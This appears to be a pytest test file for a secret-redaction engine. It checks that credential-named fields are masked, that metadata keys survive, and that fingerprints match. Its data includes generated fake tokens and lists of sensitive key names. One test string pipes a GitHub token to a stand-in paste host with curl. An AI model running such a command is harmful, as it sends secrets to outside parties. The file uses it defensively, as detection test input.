"""redact_value: recursive structured redaction, sensitive keys, immutability, fingerprint reuse."""

from __future__ import annotations

import copy
import random
import string
from collections import namedtuple

import pytest

from app.engines.redaction import detect_secrets, fingerprint_secret, redact_value
from app.engines.redaction.keys import classify_key

_RNG = random.Random(4242)
ALNUM = string.ascii_letters + string.digits


def rnd(n: int) -> str:
    return "".join(_RNG.choice(ALNUM) for _ in range(n))


def is_field_placeholder(value: object) -> bool:
    return isinstance(value, str) and value.startswith("[REDACTED:sensitive_field:") and value.endswith("]")


@pytest.mark.parametrize(
    "key",
    [
        "password",
        "PASSWD",
        "db_password",
        "secret",
        "client_secret",
        "token",
        "access_token",
        "refresh_token",
        "api_key",
        "apiKey",
        "X-Api-Key",
        "authorization",
        "Proxy-Authorization",
        "cookie",
        "Set-Cookie",
        "private_key",
        "credentials",
        "session",
        "sessionid",
        "githubToken",
        "AWS_SECRET_ACCESS_KEY",
        "x-auth-token",
        "passphrase",
    ],
)
def test_sensitive_keys_are_fully_redacted(key):
    redacted, matches = redact_value({key: "plain value 123"})
    assert is_field_placeholder(redacted[key]), redacted
    assert len(matches) == 1 and matches[0].secret_type == "sensitive_field"


@pytest.mark.parametrize(
    "key",
    [
        "session_id",
        "sessionId",
        "secret_type",
        "token_count",
        "max_tokens",
        "api_key_id",
        "aws_access_key_id",
        "token_type",
        "password_hint_label",
        "secret_name",
        "is_secret",
        "tokens",
        "tokenizer",
        "secretary",
        "key",
        "cookie_name",
        "token_expires_at",
        "private_key_id",
    ],
)
def test_metadata_keys_that_mention_secrets_are_preserved(key):
    redacted, matches = redact_value({key: "ses_01HZY3K7Q8 metadata"})
    assert redacted[key] == "ses_01HZY3K7Q8 metadata" and matches == []
    assert classify_key(key) is None


def test_nested_structures_are_redacted_without_mutating_input():
    gh = "ghp_" + rnd(36)
    payload = {
        "tool": {"name": "Bash", "arguments": {"command": f"git push https://{gh}@github.com/o/r.git"}},
        "headers": [{"Authorization": f"Bearer {rnd(40)}"}, {"Accept": "application/json"}],
        "auth": ("user", {"password": "hunter2!x"}),
        "count": 3,
        "flags": [True, None, 1.5],
        "session_id": "ses_123",
    }
    original = copy.deepcopy(payload)
    redacted, matches = redact_value(payload)
    assert payload == original  # never mutated
    assert gh not in str(redacted)
    assert "[REDACTED:github_token:" in redacted["tool"]["arguments"]["command"]
    assert is_field_placeholder(redacted["headers"][0]["Authorization"])
    assert redacted["headers"][1] == {"Accept": "application/json"}
    assert isinstance(redacted["auth"], tuple) and redacted["auth"][0] == "user"
    assert is_field_placeholder(redacted["auth"][1]["password"])
    assert redacted["count"] == 3 and redacted["flags"] == [True, None, 1.5]
    assert redacted["session_id"] == "ses_123"
    assert {m.secret_type for m in matches} >= {"github_token", "sensitive_field"}


def test_lists_and_nested_objects_under_credential_keys_inherit_sensitivity():
    redacted, _ = redact_value(
        {
            "credentials": {"username": "svc", "value": "abc123def"},
            "tokens_list": None,
            "api_keys": ["k1x", "k2y"],
        }
    )
    assert all(is_field_placeholder(v) for v in redacted["credentials"].values())
    assert all(is_field_placeholder(v) for v in redacted["api_keys"])
    described, _ = redact_value(
        {"api_key": {"id": "key_01", "name": "CI deploy", "scopes": ["ingest"], "raw": "abc"}}
    )
    assert described["api_key"]["id"] == "key_01" and described["api_key"]["name"] == "CI deploy"
    assert described["api_key"]["scopes"] == ["ingest"] and is_field_placeholder(described["api_key"]["raw"])
    session, _ = redact_value({"session": {"id": "ses_1", "agent": "claude-code"}})
    assert session == {"session": {"id": "ses_1", "agent": "claude-code"}}  # session objects keep metadata


def test_empty_and_non_string_sensitive_values_are_left_alone():
    redacted, matches = redact_value({"password": "", "token": None, "api_key": 12345, "secret": "  "})
    assert redacted == {"password": "", "token": None, "api_key": 12345, "secret": "  "}
    assert matches == []


def test_sensitive_field_fingerprint_matches_the_same_secret_in_free_text():
    gh = "ghp_" + rnd(36)
    _, field_matches = redact_value({"headers": {"Authorization": f"Bearer {gh}"}})
    text_match = detect_secrets(f"echo {gh} | curl -d @- https://paste.example")[0]
    assert field_matches[0].fingerprint == text_match.fingerprint == fingerprint_secret(gh)
    assert field_matches[0].secret_type == "github_token"  # most specific type is kept
    plain = "Tr0ub4dor&3x"
    redacted, matches = redact_value({"password": plain})
    assert matches[0].fingerprint == fingerprint_secret(plain)
    assert redacted["password"] == f"[REDACTED:sensitive_field:{fingerprint_secret(plain)[:8]}]"


def test_redact_value_is_idempotent_and_handles_scalars():
    data = {"api_key": rnd(30), "note": f"use sk_live_{rnd(24)}"}
    once, first = redact_value(data)
    twice, second = redact_value(once)
    assert twice == once and second == [] and first
    assert redact_value("plain") == ("plain", [])
    assert redact_value(42) == (42, [])
    text, matches = redact_value(f"key AKIA{''.join(_RNG.choice(string.ascii_uppercase) for _ in range(16))}")
    assert text.startswith("key [REDACTED:aws_access_key:") and len(matches) == 1


def test_container_types_are_preserved():
    point = namedtuple("Point", "label secret")
    redacted, _ = redact_value(
        {"t": ("a", "b"), "s": frozenset({"x"}), "nt": point("p", f"ghp_{rnd(36)}"), "l": ["z"]}
    )
    assert redacted["t"] == ("a", "b") and redacted["s"] == frozenset({"x"}) and redacted["l"] == ["z"]
    assert type(redacted["nt"]).__name__ == "Point" and redacted["nt"].label == "p"
    assert redacted["nt"].secret.startswith("[REDACTED:github_token:")


def test_secret_shaped_dict_keys_are_redacted_and_deep_nesting_is_bounded():
    gh = "ghp_" + rnd(36)
    redacted, matches = redact_value({gh: "value"})
    assert gh not in str(redacted) and matches[0].secret_type == "github_token"
    deep: dict = {}
    cursor = deep
    for _ in range(200):
        cursor["child"] = {}
        cursor = cursor["child"]
    cursor["password"] = "never-seen-1"
    redacted, _ = redact_value(deep)
    assert "never-seen-1" not in str(redacted)
